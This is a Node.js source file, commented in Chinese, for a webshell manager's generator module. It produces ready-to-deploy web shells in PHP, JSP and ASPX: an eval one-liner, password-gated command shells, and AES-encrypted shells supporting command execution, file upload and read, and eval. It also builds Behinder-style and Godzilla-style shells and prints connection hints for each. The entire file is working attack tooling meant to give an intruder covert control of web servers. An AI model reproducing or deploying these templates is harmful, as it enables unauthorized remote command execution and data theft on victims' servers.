// dsh-webshell-mgr 生成器：产出基础马与自研加密马（php/jsp/aspx）。
//   - oneliner：PHP 一句话（eval 通道，蚁剑默认马同形）
//   - basic-system：口令门 + 命令参数马（cmd-system 通道）
//   - dsh-aes：自研加密马 v1（c/u/d）/ v2（+e eval）——协议与 lib/protocol/dsh-aes.js 逐字段对齐
// 免杀变体不在生成器职责内（免杀对抗模式自产）；本生成器面向「快速起一个能用的马」。
// 产物落 ~/.dsh/webshell-mgr/generated/，由 store.generations 登记。

import { mkdirSync, writeFileSync, readFileSync } from "node:fs";
import { join } from "node:path";
import { randomBytes, createHash } from "node:crypto";

const md5Hex = (s) => createHash("md5").update(Buffer.from(s, "utf8")).digest("hex");

export const GEN_DIR = (base) => join(base, "generated");

export const GEN_KINDS = {
	"php-oneliner": { label: "PHP 一句话（eval 通道）", ext: "php", lang: "php" },
	"php-basic": { label: "PHP 基础马（口令门+命令通道）", ext: "php", lang: "php" },
	"php-aes1": { label: "PHP 自研加密马 v1（c/u/d）", ext: "php", lang: "php" },
	"php-aes2": { label: "PHP 自研加密马 v2（+e eval）", ext: "php", lang: "php" },
	"php-behinder": { label: "PHP 冰蝎型马（AES-ECB 形态）", ext: "php", lang: "php" },
	"php-godzilla": { label: "PHP 哥斯拉型马（XOR_BASE64 形态）", ext: "php", lang: "php" },
	"jsp-basic": { label: "JSP 基础马（口令门+命令通道）", ext: "jsp", lang: "jsp" },
	"jsp-aes1": { label: "JSP 自研加密马 v1（c/u/d）", ext: "jsp", lang: "jsp" },
	"aspx-basic": { label: "ASPX 基础马（口令门+命令通道）", ext: "aspx", lang: "aspx" },
	"aspx-aes1": { label: "ASPX 自研加密马 v1（c/u/d）", ext: "aspx", lang: "aspx" }
};

const randPass = () => randomBytes(6).toString("hex");

//#region 模板

function tplPhpOneliner(passParam) {
	return `<?php @eval($_POST['${passParam}']); ?>\n`;
}

function tplPhpBasic(passParam, cmdParam, password) {
	return `<?php
if (isset($_POST['${passParam}']) && hash_equals('${password}', $_POST['${passParam}']) && isset($_POST['${cmdParam}'])) {
    $r = false;
    if (function_exists('shell_exec')) { $r = @shell_exec($_POST['${cmdParam}'] . ' 2>&1'); }
    elseif (function_exists('system')) { ob_start(); @system($_POST['${cmdParam}'] . ' 2>&1'); $r = ob_get_clean(); }
    elseif (function_exists('exec')) { $x = array(); @exec($_POST['${cmdParam}'] . ' 2>&1', $x); $r = implode("\\n", $x); }
    echo $r === false || $r === null ? '' : $r;
}
`;
}

const PHP_AES_HEAD = `<?php
$t = isset($_SERVER['HTTP_X_T']) ? $_SERVER['HTTP_X_T'] : '';
$m = base64_decode($t, true);
if ($m === false || strlen($m) !== 32) { http_response_code(404); exit; }
$iv = substr($m, 0, 16);
$k  = substr($m, 16, 16);
$pt = openssl_decrypt(base64_decode(file_get_contents('php://input'), true), 'AES-128-CBC', $k, OPENSSL_RAW_DATA, $iv);
if ($pt === false || $pt === '') { http_response_code(500); exit; }
$op = $pt[0];
$a  = substr($pt, 1);
header('Content-Type: application/json; charset=utf-8');
function wsm_ok($d) { echo json_encode(array('code' => 0, 'data' => base64_encode($d))); exit; }
`;

const PHP_AES_CMD = `switch ($op) {
case 'c':
    $r = '';
    if (function_exists('shell_exec')) { $r = @shell_exec($a); }
    elseif (function_exists('system')) { ob_start(); @system($a); $r = ob_get_clean(); }
    elseif (function_exists('exec')) { $x = array(); @exec($a . ' 2>&1', $x); $r = implode("\\n", $x); }
    wsm_ok($r === false || $r === null ? '' : (string)$r);
case 'u':
    $p = explode('|', $a, 3);
    if (count($p) !== 3) { http_response_code(404); exit; }
    $d = base64_decode($p[2], true);
    wsm_ok(@file_put_contents($p[1], $d) === false ? 'err' : 'ok');
case 'd':
    $c = @file_get_contents($a);
    wsm_ok($c === false ? '' : $c);
`;

const PHP_AES_EVAL = `case 'e':
    ob_start();
    try { eval($a); } catch (Throwable $e) {}
    $o = ob_get_clean();
    wsm_ok($o === false ? '' : (string)$o);
`;

const PHP_AES_TAIL = `default:
    http_response_code(404); exit;
}
`;

function tplPhpAes(withEval) {
	return PHP_AES_HEAD + PHP_AES_CMD + (withEval ? PHP_AES_EVAL : "") + PHP_AES_TAIL;
}

function tplJspBasic(passParam, cmdParam, password) {
	return `<%@ page import="java.io.*,java.util.*" %>
<%
String pw = request.getParameter("${passParam}");
String c = request.getParameter("${cmdParam}");
if ("${password}".equals(pw) && c != null) {
    try {
        String os = System.getProperty("os.name").toLowerCase();
        ProcessBuilder pb = os.contains("win")
            ? new ProcessBuilder("cmd.exe", "/c", c)
            : new ProcessBuilder("/bin/sh", "-c", c);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line; StringBuilder sb = new StringBuilder();
        while ((line = br.readLine()) != null) { sb.append(line).append('\\n'); }
        p.waitFor();
        out.println(sb.toString());
    } catch (Exception e) { out.println("err: " + e.getMessage()); }
}
%>
`;
}

function tplJspAes() {
	return `<%@ page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,javax.crypto.spec.IvParameterSpec,java.util.*,java.io.*,java.nio.file.*,java.nio.charset.StandardCharsets" %>
<%
String t = request.getHeader("X-T");
byte[] m = null;
try { if (t != null) m = Base64.getDecoder().decode(t); } catch (Exception e) {}
if (m == null || m.length != 32) { response.setStatus(404); return; }
byte[] iv = Arrays.copyOfRange(m, 0, 16);
byte[] key = Arrays.copyOfRange(m, 16, 32);
java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
java.io.InputStream is = request.getInputStream();
byte[] buf = new byte[8192];
int nread;
while ((nread = is.read(buf)) > 0) { bos.write(buf, 0, nread); }
byte[] body = bos.toByteArray();
byte[] ct;
try { ct = Base64.getDecoder().decode(body); } catch (Exception e) { response.setStatus(500); return; }
byte[] pt;
try {
    Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
    cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
    pt = cipher.doFinal(ct);
} catch (Exception e) { response.setStatus(500); return; }
String op = new String(pt, 0, 1, StandardCharsets.UTF_8);
String arg = new String(pt, 1, pt.length - 1, StandardCharsets.UTF_8);
response.setContentType("application/json; charset=utf-8");
if (op.equals("c")) {
    String os = System.getProperty("os.name").toLowerCase();
    StringBuilder sb = new StringBuilder();
    try {
        ProcessBuilder pb = os.contains("win") ? new ProcessBuilder("cmd.exe", "/c", arg) : new ProcessBuilder("/bin/sh", "-c", arg);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) { sb.append(line).append('\\n'); }
        p.waitFor();
    } catch (Exception e) { sb.append("err: ").append(e.getMessage()); }
    out.println("{\\"code\\":0,\\"data\\":\\"" + Base64.getEncoder().encodeToString(sb.toString().getBytes(StandardCharsets.UTF_8)) + "\\"}");
} else if (op.equals("u")) {
    String[] parts = arg.split("\\\\|", 3);
    String res = "err";
    if (parts.length == 3) {
        try { Files.write(Paths.get(parts[1]), Base64.getDecoder().decode(parts[2])); res = "ok"; } catch (Exception e) {}
    }
    out.println("{\\"code\\":0,\\"data\\":\\"" + Base64.getEncoder().encodeToString(res.getBytes(StandardCharsets.UTF_8)) + "\\"}");
} else if (op.equals("d")) {
    byte[] data = new byte[0];
    try { data = Files.readAllBytes(Paths.get(arg)); } catch (Exception e) {}
    out.println("{\\"code\\":0,\\"data\\":\\"" + Base64.getEncoder().encodeToString(data) + "\\"}");
} else {
    response.setStatus(404);
}
%>
`;
}

/** 冰蝎形态马：key=md5(密码)[0:16]，请求体=b64(AES-128-ECB)，eval 载荷（桥接通道目标）。 */
function tplPhpBehinder(password) {
	return `<?php
@error_reporting(0);
$k = '${md5Hex(password).slice(0, 16)}';
$d = @openssl_decrypt(base64_decode(file_get_contents('php://input')), 'AES-128-ECB', $k, OPENSSL_RAW_DATA);
if ($d !== false) { @eval($d); }
`;
}

/** 哥斯拉形态马：password=POST 字段名，key=md5(密钥源)[0:16]；session 载荷注册 + md5 定位符回传。 */
function tplPhpGodzilla(passParam, secretKey) {
	return `<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function wsm_enc($D, $K){
    for ($i = 0; $i < strlen($D); $i++) { $D[$i] = $D[$i] ^ $K[($i + 1) & 15]; }
    return $D;
}
$pass = '${passParam}';
$key = '${md5Hex(secretKey).slice(0, 16)}';
if (isset($_POST[$pass])) {
    $data = wsm_enc(base64_decode($_POST[$pass]), $key);
    if (isset($_SESSION['w'])) {
        $payload = wsm_enc($_SESSION['w'], $key);
        if (strpos($payload, 'getBasicsInfo') === false) { $payload = wsm_enc($payload, $key); }
        eval($payload);
        echo substr(md5($pass . $key), 0, 16);
        echo base64_encode(wsm_enc(@run($data), $key));
        echo substr(md5($pass . $key), 16);
    } else {
        if (strpos($data, 'getBasicsInfo') !== false) {
            $_SESSION['w'] = wsm_enc($data, $key);
        }
    }
}
`;
}

function tplAspxBasic(passParam, cmdParam, password) {
	return `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load() {
    if (Request.Form["${passParam}"] != "${password}" || Request.Form["${cmdParam}"] == null) return;
    string c = Request.Form["${cmdParam}"];
    try {
        var psi = new ProcessStartInfo("cmd.exe", "/c " + c) { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
        if (!Environment.OSVersion.ToString().Contains("Windows"))
            psi = new ProcessStartInfo("/bin/sh", "-c \\"" + c.Replace("\\"", "\\\\\\"") + "\\"") { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
        using (var p = Process.Start(psi)) {
            Response.Write(p.StandardOutput.ReadToEnd());
            Response.Write(p.StandardError.ReadToEnd());
            p.WaitForExit(20000);
        }
    } catch (Exception e) { Response.Write("err: " + e.Message); }
}
</script>
`;
}

function tplAspxAes() {
	return `<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
static string J(byte[] d) { return "{\\"code\\":0,\\"data\\":\\"" + Convert.ToBase64String(d) + "\\"}"; }
void Page_Load() {
    string t = Request.Headers["X-T"] ?? "";
    byte[] m;
    try { m = Convert.FromBase64String(t); } catch { Response.StatusCode = 404; return; }
    if (m.Length != 32) { Response.StatusCode = 404; return; }
    byte[] iv = new byte[16], key = new byte[16];
    Array.Copy(m, 0, iv, 0, 16); Array.Copy(m, 16, key, 0, 16);
    string bodyStr; using (var sr = new StreamReader(Request.InputStream, Encoding.ASCII)) { bodyStr = sr.ReadToEnd(); }
    byte[] ct;
    try { ct = Convert.FromBase64String(bodyStr.Trim()); } catch { Response.StatusCode = 500; return; }
    byte[] pt;
    try {
        using (var aes = Aes.Create()) {
            aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; aes.Key = key; aes.IV = iv;
            using (var dec = aes.CreateDecryptor()) pt = dec.TransformFinalBlock(ct, 0, ct.Length);
        }
    } catch { Response.StatusCode = 500; return; }
    string op = Encoding.UTF8.GetString(pt, 0, 1);
    string arg = Encoding.UTF8.GetString(pt, 1, pt.Length - 1);
    Response.ContentType = "application/json";
    if (op == "c") {
        var sb = new StringBuilder();
        try {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + arg) { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
            if (!Environment.OSVersion.ToString().Contains("Windows"))
            psi = new ProcessStartInfo("/bin/sh", "-c \\"" + arg.Replace("\\"", "\\\\\\"") + "\\"") { RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false };
            using (var p = Process.Start(psi)) { sb.Append(p.StandardOutput.ReadToEnd()); sb.Append(p.StandardError.ReadToEnd()); p.WaitForExit(20000); }
        } catch (Exception e) { sb.Append("err: ").Append(e.Message); }
        Response.Write(J(Encoding.UTF8.GetBytes(sb.ToString())));
    } else if (op == "u") {
        var parts = arg.Split(new[] { '|' }, 3);
        byte[] res = Encoding.UTF8.GetBytes("err");
        if (parts.Length == 3) { try { File.WriteAllBytes(parts[1], Convert.FromBase64String(parts[2])); res = Encoding.UTF8.GetBytes("ok"); } catch { } }
        Response.Write(J(res));
    } else if (op == "d") {
        byte[] data = new byte[0];
        try { data = File.ReadAllBytes(arg); } catch { }
        Response.Write(J(data));
    } else {
        Response.StatusCode = 404;
    }
}
</script>
`;
}

//#endregion

/**
 * 生成一个马。
 * @returns {{ name, kind, lang, filePath, content, hint }}
 */
export function generate(kind, opts = {}) {
	const meta = GEN_KINDS[kind];
	if (!meta) throw new Error(`未知生成类型 ${kind}（可选：${Object.keys(GEN_KINDS).join(" / ")}）`);
	const passParam = String(opts.passParam ?? "pass") || "pass";
	const cmdParam = String(opts.cmdParam ?? "cmd") || "cmd";
	const password = String(opts.password ?? "") || randPass();
	let content;
	switch (kind) {
		case "php-oneliner": content = tplPhpOneliner(passParam); break;
		case "php-basic": content = tplPhpBasic(passParam, cmdParam, password); break;
		case "php-aes1": content = tplPhpAes(false); break;
		case "php-aes2": content = tplPhpAes(true); break;
		case "php-behinder": content = tplPhpBehinder(password); break;
		case "php-godzilla": content = tplPhpGodzilla(passParam, String(opts.secretKey ?? "") || password); break;
		case "jsp-basic": content = tplJspBasic(passParam, cmdParam, password); break;
		case "jsp-aes1": content = tplJspAes(); break;
		case "aspx-basic": content = tplAspxBasic(passParam, cmdParam, password); break;
		case "aspx-aes1": content = tplAspxAes(); break;
		default: throw new Error("unreachable");
	}
	const name = String(opts.name ?? "").trim() || `${kind}-${Date.now().toString(36)}`;
	return { name, kind, lang: meta.lang, ext: meta.ext, content, password, passParam, cmdParam };
}

/** 生成并落盘（baseDir = 插件数据目录）。 */
export function makeAndSave(baseDir, kind, opts = {}) {
	const item = generate(kind, opts);
	const dir = GEN_DIR(baseDir);
	mkdirSync(dir, { recursive: true });
	const safe = item.name.replace(/[^\w.-]+/g, "_");
	const filePath = join(dir, `${safe}.${item.ext}`);
	writeFileSync(filePath, item.content, "utf8");
	const connHint = item.kind.endsWith("-oneliner")
		? `连接：协议=cmd-eval，POST 参数名=${item.passParam}，URL=<马地址>`
		: item.kind.endsWith("-basic")
			? `连接：协议=cmd-system，口令参数=${item.passParam}，口令=${item.password}，命令参数=${item.cmdParam}`
			: item.kind === "php-behinder"
				? `连接：协议=behinder，口令=${item.password}（key=md5(口令)[0:16] 自动派生）`
				: item.kind === "php-godzilla"
					? `连接：协议=godzilla，password=POST 参数名（${item.passParam}），密钥源=${String(opts.secretKey ?? "") || item.password}`
					: `连接：协议=dsh-aes（无需口令——密钥每请求随机）；${item.kind === "php-aes2" ? "v2 含 eval 能力（结构化文件/数据库操作可用）" : "v1 仅命令+二进制读写"}`;
	return { ...item, filePath, connHint };
}

/** 从既有文件导入（免杀模式产物 / 存量马登记）。 */
export function importFromFile(baseDir, srcPath, opts = {}) {
	const content = readFileSync(srcPath, "utf8");
	const name = String(opts.name ?? "").trim() || (srcPath.split("/").pop() ?? "imported");
	const ext = (name.includes(".") ? name.split(".").pop() : "php") ?? "php";
	const dir = GEN_DIR(baseDir);
	mkdirSync(dir, { recursive: true });
	const safe = name.replace(/[^\w.-]+/g, "_");
	const filePath = join(dir, safe);
	writeFileSync(filePath, content, "utf8");
	return { name, kind: "import", lang: ext === "jsp" ? "jsp" : ext === "aspx" ? "aspx" : "php", filePath, content };
}
